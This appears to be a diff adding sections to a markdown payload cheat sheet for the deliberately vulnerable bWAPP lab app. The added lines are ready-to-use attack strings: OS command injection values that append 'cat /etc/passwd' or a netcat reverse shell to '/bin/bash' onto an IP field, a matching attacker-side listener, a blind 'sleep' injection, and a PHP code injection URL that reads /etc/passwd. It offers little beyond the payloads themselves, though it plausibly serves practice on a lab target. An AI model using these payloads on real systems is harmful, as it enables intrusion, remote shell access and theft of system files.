@@ -25,3 +25,27 @@ Attacker's machine:
 nc -lvp 775
 ```
 
+### OS Command Injection
+```
+127.0.0.1; cat /etc/passwd
+127.0.0.1 & cat /etc/passwd
+127.0.0.1 | cat /etc/passwd
+127.0.0.1 && nc -vn 192.168.254.128 775 -e /bin/bash
+```
+
+Attacker's machine:
+```
+nc -lvp 775
+```
+
+
+### OS Command Injection - Blind
+```
+127.0.0.1 | sleep 10
+```
+
+### PHP Code Injection
+
+```
+192.168.200.130/bWAPP/phpi.php?message=a;echo "what"; $fp = fopen("/etc/passwd","r");$result = fread($fp,8192); echo $result
+```
